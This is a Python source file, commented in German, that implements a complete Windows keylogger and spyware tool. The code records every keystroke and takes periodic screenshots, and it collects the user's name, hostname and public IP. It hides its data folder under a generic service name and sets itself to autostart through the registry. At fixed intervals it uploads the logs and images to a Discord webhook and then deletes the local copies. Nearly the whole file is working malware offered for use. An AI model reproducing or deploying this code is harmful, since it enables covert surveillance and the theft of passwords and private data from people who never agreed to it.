import os
import time
import threading
import keyboard
import pyautogui
import requests
import getpass
import platform
import socket
import winreg
import shutil
from datetime import datetime
from PIL import Image
import psutil

# Konfigurationsoptionen
LOG_FILENAME = "system_log.txt"
PROGRAM_NAME = "SystemService"
UPLOAD_INTERVAL = 30  # Upload
SCREENSHOT_INTERVAL = 30  # Screenshot
MAX_CONTENT_LENGTH = 1900  # Discord-Nachrichtenlimit
DISCORD_WEBHOOK_URL = "Your Discord Webhock"  # Ersetze mit deinem Webhook

# Globale Pfade
APPDATA = os.getenv("LOCALAPPDATA")
LOG_FILE_PATH = os.path.join(APPDATA, PROGRAM_NAME, LOG_FILENAME)
SCREENSHOT_DIR = os.path.join(APPDATA, PROGRAM_NAME, "screenshots")

# Initialisiert versteckte Verzeichnisse
def initialize_paths():
    base_dir = os.path.join(APPDATA, PROGRAM_NAME)
    os.makedirs(base_dir, exist_ok=True)
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    
    # Verstecke den Ordner unter Windows
    try:
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(base_dir, 0x02)  # FILE_ATTRIBUTE_HIDDEN
    except:
        pass

# Fügt das Programm zum Autostart hinzu
def add_to_startup():
    script_path = os.path.abspath(__file__)
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ, f'"{script_path}"')
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Autostart fehlgeschlagen: {e}")

# Sammelt Systeminformationen
def collect_system_info():
    username = getpass.getuser()
    hostname = socket.gethostname()
    system_info = platform.system() + " " + platform.release()
    
    # IP-Adresse ermitteln
    try:
        ip = requests.get("http://checkip.amazonaws.com").text.strip()
    except:
        ip = "Unknown"
    
    info = f"**Benutzer:** {username}\n**Computer:** {hostname}\n**IP:** {ip}\n**System:** {system_info}"
    
    with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"\n\n=== NEUE SITZUNG GESTARTET {now} ===\n\n")
        f.write(info + "\n\n")
    
    return info

# Protokolliert alle Tastenanschläge
def log_keys():
    def on_key(event):
        with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
            # Alle Tasten werden in eckigen Klammern geloggt
            f.write(f"[{event.name}]")
    
    keyboard.on_press(on_key)
    keyboard.wait()

# Erstellt einen Screenshot
def capture_screenshot():
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SCREENSHOT_DIR, f"screen_{now}.png")
    
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    
    with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
        f.write(f"\n[SCREENSHOT ERSTELLT: {filename}]\n")
    
    return filename

# Sendet eine Nachricht an Discord
def send_discord_message(content, username="Keylogger"):
    payload = {
        "content": content,
        "username": username,
        "avatar_url": "https://i.imgur.com/aRkngqC.png"
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        return response.status_code == 204
    except:
        return False

# Sendet eine Datei an Discord
def send_discord_file(filepath, filename):
    try:
        with open(filepath, "rb") as f:
            files = {"file": (filename, f)}
            response = requests.post(DISCORD_WEBHOOK_URL, files=files)
        return response.status_code == 204
    except:
        return False

# Sendet Log-Inhalte an Discord
def send_log_content(system_info):
    username = f"Keylogger_{datetime.now().strftime('%H_%M_%S')}"
    
    # Sende Systeminformationen zuerst
    send_discord_message(f"## 📱 Neue Verbindung hergestellt! 📱\n{system_info}", username)
    
    try:
        with open(LOG_FILE_PATH, "r", encoding="utf-8") as f:
            content = f.read()
    except:
        return
    
    # Teile Inhalt in Chunks
    chunks = [content[i:i + MAX_CONTENT_LENGTH] for i in range(0, len(content), MAX_CONTENT_LENGTH)]
    
    for chunk in chunks:
        if chunk.strip():
            escaped_chunk = chunk.replace("```", "\\`\\`\\`")
            message = f"```\n{escaped_chunk}\n```"
            send_discord_message(message, username)
    
    # Log-Datei leeren
    with open(LOG_FILE_PATH, "w", encoding="utf-8") as f:
        f.write("--- Log wurde übertragen ---\n")

# Sendet Screenshots an Discord
def send_screenshots():
    for filename in os.listdir(SCREENSHOT_DIR):
        if filename.endswith(".png"):
            filepath = os.path.join(SCREENSHOT_DIR, filename)
            if send_discord_file(filepath, filename):
                os.remove(filepath)

# Hauptprogramm
def main():
    initialize_paths()
    add_to_startup()
    system_info = collect_system_info()
    
    # Starte Keylogging in einem separaten Thread
    keylog_thread = threading.Thread(target=log_keys, daemon=True)
    keylog_thread.start()
    
    # Initiale Nachricht
    send_discord_message(f"## 🚀 Keylogger gestartet! 🚀\n{system_info}", "Keylogger_Start")
    
    last_upload = time.time()
    last_screenshot = time.time()
    
    while True:
        current_time = time.time()
        
        # Screenshot erstellen
        if current_time - last_screenshot >= SCREENSHOT_INTERVAL:
            capture_screenshot()
            last_screenshot = current_time
        
        # Log und Screenshots hochladen
        if current_time - last_upload >= UPLOAD_INTERVAL:
            send_log_content(system_info)
            send_screenshots()
            last_upload = current_time
        
        time.sleep(0.1)

if __name__ == "__main__":
    main()
